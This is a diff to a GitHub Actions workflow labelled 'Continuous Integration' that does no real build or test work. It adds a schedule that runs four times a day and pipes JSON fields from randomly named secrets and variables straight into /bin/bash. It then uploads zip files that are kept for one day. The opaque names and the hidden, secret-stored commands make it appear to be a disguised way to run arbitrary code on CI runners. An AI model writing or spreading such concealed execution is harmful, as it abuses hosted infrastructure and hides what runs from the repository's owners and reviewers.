@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '25 5,11,17,23 * * *'
 env:
   CI: true
 jobs:
@@ -13,18 +15,16 @@ jobs:
           fetch-depth: 0
       - name: Start
         env:
-          m92: ${{ secrets.m92 }}
+          rzo61835: ${{ secrets.rzo61835 }}
         run: |
-          printf '%s' "$m92" | jq -r .xv83297 | /bin/bash
-          printf '%s' "$li47058" | jq -r .wuw42 | /bin/bash
-          printf '%s' "$fsdht685" | jq -r .t1 | /bin/bash
-          printf '%s' "$bfft19" | jq -r .a0 | /bin/bash
-          echo $g994 | jq -r .vh8 | /bin/bash
-          echo $wwvmk4698 | jq -r .sque54196 | /bin/bash
+          printf '%s' "$rzo61835" | jq -r .c0 | /bin/bash
+          echo $vldz3207 | jq -r .ddf4 | /bin/bash
+          echo $y40524 | jq -r .i26 | /bin/bash
+          echo $tgtv39 | jq -r .kokp3368 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: bS9EBGi3
+          name: uEfiLxRO
           path: "*.zip"
           retention-days: 1
